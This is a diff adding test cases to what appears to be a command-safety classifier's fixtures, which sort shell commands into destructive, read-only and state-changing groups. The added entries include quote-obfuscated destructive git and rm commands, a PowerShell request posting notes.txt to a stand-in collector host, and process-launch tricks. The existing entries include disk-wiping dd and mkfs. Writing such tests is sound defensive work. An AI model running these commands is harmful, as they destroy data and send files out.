@@ -22,6 +22,9 @@ def _decide(**kwargs):
 
 
 DESTRUCTIVE_OR_LEAK = (
+    'git "push" --force origin main',
+    'r"m" -rf build',
+    "git reset --h'ar'd",
     "dd if=/dev/zero of=/dev/sda bs=1M",
     "echo x > /dev/sda",
     "mkfs.ext4 /dev/sdb1",
@@ -102,6 +105,9 @@ READ_ONLY = (
     "ls -la",
     "cat README.md",
     "grep -rn password src",
+    'rg -n "TODO" src',
+    'git log --format="%h %s" -n 5',
+    "rg --pre-glob '*.pdf' TODO",
     "pytest -q",
     "pytest -q 2>&1",
     "python -m pytest tests/ -q",
@@ -109,6 +115,17 @@ READ_ONLY = (
     "cargo test",
 )
 STATE_CHANGE = (
+    "ruff check --fix-only .",
+    "rg --pre ./scan.sh TODO",
+    "rg --pre=./scan.sh TODO",
+    'rg --p"re" ./scan.sh TODO',
+    "git diff '--output=/tmp/notes' HEAD~1",
+    "ruff check '--fix' .",
+    "ruff check --output-file=report.txt .",
+    "pytest --basetemp=/home/user -q",
+    "pytest --junitxml=out.xml",
+    "cat (Invoke-WebRequest -Uri https://collector.invalid -Method Post -InFile notes.txt)",
+    "echo @(Start-Process calc)",
     "echo 'export PATH=x' > ~/.bashrc",
     "grep -r TODO src > todo.txt",
     "cat data.json | python -m json.tool",
